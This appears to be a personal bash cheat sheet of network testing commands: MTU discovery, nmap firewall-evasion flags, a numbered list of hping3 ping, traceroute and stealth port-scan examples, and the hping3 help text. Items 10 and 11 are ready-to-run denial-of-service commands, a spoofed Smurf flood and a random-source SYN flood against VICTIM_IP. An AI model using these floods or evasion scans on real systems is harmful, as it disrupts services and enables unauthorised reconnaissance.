#!/usr/bin/env bash

# https://blog.cloudflare.com/path-mtu-discovery-in-practice/
# Detect exceeded MTU - ICMP type 3 code 4 (Destination Unreachable Message; fragmentation needed and DF set)[http://www.faqs.org/rfcs/rfc792.html]
# Minimal required MTU - IPv6 = 1,280, IPv4 = 576
tcpdump -s0 -p -ni eth0 'icmp and icmp[0] == 3 and icmp[1] == 4'
tracepath -n 192.168.1.2
# http://www.elifulkerson.com/projects/mturoute.php
mturoute

# Firewall bypassing, rule testing
# - https://dzone.com/articles/firewall-bypassing-techniques-with-nmap-and-hping3

# Fragment offset size
nmap --mtu 16 192.168.1.12

# Invalid TCP/UDP/SCTP checksum for packets transmitted to our target. As practically every host IP stack would correctly drop the packets, each response accepted is possibly originating from a firewall or Intrusion Detection System
nmap --badsum 192.168.1.12

# - http://0daysecurity.com/articles/hping3_examples.html
# - http://0daysecurity.com/penetration-testing/discovery-and-probing.html

# 1. Testing ICMP: In this example hping3 will behave like a normal ping utility, sending ICMP-echo und receiving ICMP-reply
hping3 -1 0daysecurity.com

# 2. Traceroute using ICMP: This example is similar to famous utilities like tracert (windows) or traceroute (linux) who uses ICMP packets increasing every time in 1 its TTL value.
hping3 --traceroute -V -1 0daysecurity.com

# 3. Checking port: Here hping3 will send a Syn packet to a specified port (80 in our example). We can control also from which local port will start the scan (5050).
hping3 -V -S -p 80 -s 5050 0daysecurity.com
# || scan all ports starting at 1
hping3 -V -S -p ++1 0daysecurity.com

# 4. Traceroute to a determined port: A nice feature from Hping3 is that you can do a traceroute to a specified port watching where your packet is blocked. It can just be done by adding --traceroute to the last command.
hping3 --traceroute -V -S -p 80 -s 5050 0daysecurity.com

# 5. Other types of ICMP: This example sends a ICMP address mask request ( Type 17 ).
hping3 -c 1 -V -1 -C 17 0daysecurity.com

# 6. Other types of Port Scanning: First type we will try is the FIN scan. In a TCP connection the FIN flag is used to start the connection closing routine. If we do not receive a reply, that means the port is open. Normally firewalls send a RST+ACK packet back to signal that the port is closed..
hping3 -c 1 -V -p 80 -s 5050 -F 0daysecurity.com

# 7. Ack Scan: This scan can be used to see if a host is alive (when Ping is blocked for example). This should send a RST response back if the port is open.
hping3 -c 1 -V -p 80 -s 5050 -A 0daysecurity.com

# 8. Xmas Scan: This scan sets the sequence number to zero and set the URG + PSH + FIN flags in the packet. If the target device's TCP port is closed, the target device sends a TCP RST packet in reply. If the target device's TCP port is open, the target discards the TCP Xmas scan, sending no reply.
hping3 -c 1 -V -p 80 -s 5050 -M 0 -UPF 0daysecurity.com

# 9. Null Scan: This scan sets the sequence number to zero and have no flags set in the packet. If the target device's TCP port is closed, the target device sends a TCP RST packet in reply. If the target device's TCP port is open, the target discards the TCP NULL scan, sending no reply.
hping3 -c 1 -V -p 80 -s 5050 -Y 0daysecurity.com

# 10. Smurf Attack: This is a type of denial-of-service attack that floods a target system via spoofed broadcast ping messages.
hping3 -1 --flood -a VICTIM_IP BROADCAST_ADDRESS

# 11. DOS Land Attack:
hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source VICTIM_IP

# --flood: sent packets as fast as possible. Don't show replies.
# --rand-dest: random destionation address mode. see the man.
# -V <-- Verbose
# -c --count: packet count
# -d --data: data size
# -S --syn: set SYN flag
# -w --win: winsize (default 64)
# -p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
# -s --baseport: base source port (default random)

# Anex A Hping3 Help
# 
# usage: hping3 host [options]
# -h --help show this help
# -v --version show version
# -c --count packet count
# -i --interval wait (uX for X microseconds, for example -i u1000)
# --fast alias for -i u10000 (10 packets for second)
# --faster alias for -i u1000 (100 packets for second)
# --flood sent packets as fast as possible. Don't show replies.
# -n --numeric numeric output
# -q --quiet quiet
# -I --interface interface name (otherwise default routing interface)
# -V --verbose verbose mode
# -D --debug debugging info
# -z --bind bind ctrl+z to ttl (default to dst port)
# -Z --unbind unbind ctrl+z
# --beep beep for every matching packet received
# 
# Mode
# default mode TCP
# -0 --rawip RAW IP mode
# -1 --icmp ICMP mode
# -2 --udp UDP mode
# -8 --scan SCAN mode.
# Example: hping --scan 1-30,70-90 -S www.target.host
# -9 --listen listen mode
# 
# IP
# -a --spoof spoof source address
# --rand-dest random destionation address mode. see the man.
# --rand-source random source address mode. see the man.
# -t --ttl ttl (default 64)
# -N --id id (default random)
# -W --winid use win* id byte ordering
# -r --rel relativize id field (to estimate host traffic)
# -f --frag split packets in more frag. (may pass weak acl)
# -x --morefrag set more fragments flag
# -y --dontfrag set dont fragment flag
# -g --fragoff set the fragment offset
# -m --mtu set virtual mtu, implies --frag if packet size > mtu
# -o --tos type of service (default 0x00), try --tos help
# -G --rroute includes RECORD_ROUTE option and display the route buffer
# --lsrr loose source routing and record route
# --ssrr strict source routing and record route
# -H --ipproto set the IP protocol field, only in RAW IP mode
# 
# 
# ICMP
# -C --icmptype icmp type (default echo request)
# -K --icmpcode icmp code (default 0)
# --force-icmp send all icmp types (default send only supported types)
# --icmp-gw set gateway address for ICMP redirect (default 0.0.0.0)
# --icmp-ts Alias for --icmp --icmptype 13 (ICMP timestamp)
# --icmp-addr Alias for --icmp --icmptype 17 (ICMP address subnet mask)
# --icmp-help display help for others icmp options
# 
# 
# UDP/TCP
# -s --baseport base source port (default random)
# -p --destport [+][+]<port> destination port(default 0) ctrl+z inc/dec
# -k --keep keep still source port
# -w --win winsize (default 64)
# -O --tcpoff set fake tcp data offset (instead of tcphdrlen / 4)
# -Q --seqnum shows only tcp sequence number
# -b --badcksum (try to) send packets with a bad IP checksum many systems will fix the IP checksum sending the packet so you'll get bad UDP/TCP checksum instead.
# -M --setseq set TCP sequence number
# -L --setack set TCP ack
# -F --fin set FIN flag
# -S --syn set SYN flag
# -R --rst set RST flag
# -P --push set PUSH flag
# -A --ack set ACK flag
# -U --urg set URG flag
# -X --xmas set X unused flag (0x40)
# -Y --ymas set Y unused flag (0x80)
# --tcpexitcode use last tcp->th_flags as exit code
# --tcp-timestamp enable the TCP timestamp option to guess the HZ/uptime
# 
# 
# Common
# -d --data data size (default is 0)
# -E --file data from file
# -e --sign add 'signature'
# -j --dump dump packets in hex
# -J --print dump printable characters
# -B --safe enable 'safe' protocol
# -u --end tell you when --file reached EOF and prevent rewind
# -T --traceroute traceroute mode (implies --bind and --ttl 1)
# --tr-stop Exit when receive the first not ICMP in traceroute mode
# --tr-keep-ttl Keep the source TTL fixed, useful to monitor just one hop
# --tr-no-rtt Don't calculate/show RTT information in traceroute mode
# 
# 
# ARS packet description (new, unstable)
# --apd-send Send the packet described with APD (see docs/APD.txt)
